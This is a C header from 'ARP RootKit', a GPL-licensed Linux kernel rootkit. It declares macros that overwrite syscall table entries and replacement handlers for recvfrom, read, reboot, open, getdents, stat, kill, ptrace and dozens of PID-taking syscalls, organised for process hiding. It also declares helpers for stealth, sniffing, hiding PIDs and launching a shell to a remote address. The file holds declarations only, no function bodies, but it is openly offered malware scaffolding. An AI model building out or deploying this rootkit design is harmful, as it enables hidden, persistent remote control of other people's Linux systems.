/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * Here the hook handlers.
 */

#ifndef HOOKS_H

#include <linux/in.h>
#include <linux/stat.h>
#include <linux/perf_event.h>

#include "ctl.h"

/*
 * Macros.
 */
#define MAP_FAILED     ((void *) -1)
#define MAX_PATH 4096

/*
 * (Un)Hooking macros.
 */
#define HOOK64(nr, handler) my_sct[nr] = handler
#define HOOK32(nr, handler) my_ia32sct[nr] = handler
#define UNHOOK64(nr) my_sct[nr] = sys_call_table[nr]
#define UNHOOK32(nr) my_ia32sct[nr] = ia32_sys_call_table[nr]

/*
 * Type definitions.
 */
struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[1];
};

struct linux_dirent64 {
	u64		d_ino;
	s64		d_off;
	unsigned short	d_reclen;
	unsigned char	d_type;
	char		d_name[0];
};

struct stat64 {
	unsigned long long st_dev;	/* Device.  */
	unsigned long long st_ino;	/* File serial number.  */
	unsigned int	st_mode;	/* File mode.  */
	unsigned int	st_nlink;	/* Link count.  */
	unsigned int	st_uid;		/* User ID of the file's owner.  */
	unsigned int	st_gid;		/* Group ID of the file's group. */
	unsigned long long st_rdev;	/* Device number, if device.  */
	unsigned long long __pad1;
	long long	st_size;	/* Size of file, in bytes.  */
	int		st_blksize;	/* Optimal block size for I/O.  */
	int		__pad2;
	long long	st_blocks;	/* Number 512-byte blocks allocated. */
	int		st_atime;	/* Time of last access.  */
	unsigned int	st_atime_nsec;
	int		st_mtime;	/* Time of last modification.  */
	unsigned int	st_mtime_nsec;
	int		st_ctime;	/* Time of last status change.  */
	unsigned int	st_ctime_nsec;
	unsigned int	__unused4;
	unsigned int	__unused5;
};

typedef pid_t id_t;
typedef pid_t idtype_t;

/*
 * Hook handlers.
 */

/* Network hooks */
extern asmlinkage long my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len);
extern asmlinkage long my_read64(int fd, void __user *buf, size_t len);

/* RootKit control */
extern asmlinkage long my_reboot64(int magic1, int magic2, unsigned int cmd, void *arg);

/* Process hidding */
extern asmlinkage long my_open64(const char *path, int flags, umode_t mode);
extern asmlinkage long my_openat64(int dfd, const char *path, int flags, umode_t mode);
extern asmlinkage long my_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
extern asmlinkage long my_getdents6464(unsigned int fd, struct linux_dirent64 __user *dirent,  unsigned int count);
extern asmlinkage long my_fstatat6464(int dfd, const char __user *filename, struct stat __user *statbuf, int flag);
extern asmlinkage long my_lstat6464(const char __user *filename, struct stat64 __user *statbuf);
extern asmlinkage long my_stat6464(const char __user *filename, struct stat64 __user *statbuf);
extern asmlinkage long my_newfstatat64(int dfd, const char __user *filename, struct stat __user *statbuf, int flag);
extern asmlinkage long my_newlstat64(const char __user *filename, struct stat __user *statbuf);
extern asmlinkage long my_newstat64(const char __user *filename, struct stat __user *statbuf);
extern asmlinkage long my_lstat64(const char __user * filename, struct stat __user * statbuf);
extern asmlinkage long my_stat64(const char __user *filename, struct stat __user *statbuf);
//
extern long (*tr_clone64)(long a1, long a2, long a3, long a4, long a5, long a6);
extern void *tr_clone64_bytecode;
extern asmlinkage long my_fork64(void);
extern asmlinkage long my_vfork64(void);
extern asmlinkage long my_clone64(long a1, long a2, long a3, long a4, long a5, long a6);
extern asmlinkage long my_wait464(int *status);
extern asmlinkage long my_kill64(pid_t pid, int sig);
extern asmlinkage long my_waitid64(idtype_t idtype, id_t id, siginfo_t *infop, int options);
extern asmlinkage long my_getpid64(void);
extern asmlinkage long my_gettid64(void);
extern asmlinkage long my_getppid64(void);
extern asmlinkage long my_getpgid64(pid_t pid);
extern asmlinkage long my_setpgid64(pid_t pid, pid_t pgid);
extern asmlinkage long my_getpgrp64(void);
extern asmlinkage long my_getsid64(pid_t pid);
extern asmlinkage long my_setsid64(void);
extern asmlinkage long my_tkill64(pid_t pid, int sig);
extern asmlinkage long my_tgkill64(pid_t tgid, pid_t pid, int sig);
extern asmlinkage long my_ptrace64(long request, pid_t pid, unsigned long addr, unsigned long data);
extern asmlinkage long my_rt_sigqueueinfo64(pid_t pid, int sig, siginfo_t *uinfo);
extern asmlinkage long my_rt_tgsigqueueinfo64(pid_t tgid, pid_t pid, int sig, siginfo_t *uinfo);
extern asmlinkage long my_sched_setparam64(pid_t pid, struct sched_param *param);
extern asmlinkage long my_sched_getparam64(pid_t pid, struct sched_param *param);
extern asmlinkage long my_sched_setscheduler64(pid_t pid, int policy, struct sched_param *param);
extern asmlinkage long my_sched_getscheduler64(pid_t pid);
extern asmlinkage long my_sched_rr_get_interval64(pid_t pid, struct timespec *interval);
extern asmlinkage long my_sched_setaffinity64(pid_t pid, unsigned int len, unsigned long *user_mask_ptr);
extern asmlinkage long my_sched_getaffinity64(pid_t pid, unsigned int len, unsigned long *user_mask_ptr);
extern asmlinkage long my_migrate_pages64(pid_t pid, unsigned long maxnode, const unsigned long *old_nodes, const unsigned long *new_nodes);
extern asmlinkage long my_move_pages64(pid_t pid, unsigned long nr_pages, const void **pages, const int *nodes, int *status, int flags);
extern asmlinkage long my_perf_event_open64(struct perf_event_attr *attr_uptr, pid_t pid, int cpu, int group_fd, unsigned long flags); // this API needs to read & write hooking also.
extern asmlinkage long my_prlimit6464(pid_t pid, unsigned int resource, const struct rlimit64 *new_rlim, struct rlimit64 *old_rlim);
extern asmlinkage long my_process_vm_readv64(pid_t pid, const struct iovec *lvec, unsigned long liovcnt, const struct iovec *rvec, unsigned long riovcnt, unsigned long flags);
extern asmlinkage long my_process_vm_writev64(pid_t pid, const struct iovec *lvec, unsigned long liovcnt, const struct iovec *rvec, unsigned long riovcnt, unsigned long flags);
extern asmlinkage long my_kcmp64(pid_t pid1, pid_t pid2, int type, unsigned long idx1, unsigned long idx2);
extern asmlinkage long my_sched_setattr64(pid_t pid, struct sched_attr __user *attr, unsigned int flags);
extern asmlinkage long my_sched_getattr64(pid_t pid, struct sched_attr __user *attr, unsigned int size, unsigned int flags);
extern asmlinkage long my_get_robust_list64(pid_t pid, struct robust_list_head **head_ptr, size_t *len_ptr);
extern asmlinkage long my_getpriority64(int which, id_t who); // `who` is a PID when `which` is `PRIO_PROCESS`, and PGID when `PRIO_PGRP`.
extern asmlinkage long my_setpriority64(int which, id_t who, int prio);
extern asmlinkage long my_ioprio_get64(int which, int who); // `who` is a PID when `which` is `IOPRIO_WHO_PROCESS`, and PGID when `IOPRIO_WHO_PGRP`.
extern asmlinkage long my_ioprio_set64(int which, int who, int ioprio);
extern asmlinkage long my_capget64(cap_user_header_t hdrp, cap_user_data_t datap); // cap_user_header_t has a member: pid.
extern asmlinkage long my_capset64(cap_user_header_t hdrp, const cap_user_data_t datap);
extern asmlinkage long my_set_tid_address64(int *tidptr); // returns always TID
extern asmlinkage long my_seccomp64(unsigned int operation, unsigned int flags, void *args); // On error, if SECCOMP_FILTER_FLAG_TSYNC was used, the return value is the ID of the thread that caused the synchronization failure.  (This ID is a kernel thread ID of the type returned by clone(2) and gettid(2).)  On other errors, -1 is returned, and errno is set to indicate the cause of the error.
extern asmlinkage long my_prctl64(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5); // EINVAL option is PR_SET_PTRACER and arg2 is not 0, PR_SET_PTRACER_ANY, or the PID of an existing process.
// extern asmlinkage 

/* compat hook handlers */
extern asmlinkage int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len);
extern asmlinkage int my_read32(int fd, void __user *buf, size_t len);

/*
 * RK Kernel funcs: used for stealth, hidding, sniffing, etc.
 */
extern int get_fd_path(int fd, char *path);
extern bool check_pid_in_path(int dfd, const char *path);
extern void *alloc_umem(size_t len);
extern int free_umem(void *ptr, size_t len);
extern int launch_shell(struct sockaddr_in dest);
extern long arprk_ctl(struct arprk_ctl *ctl);
extern int hide_pid(pid_t pid);
extern int unhide_pid(pid_t pid);

#define HOOKS_H

#endif
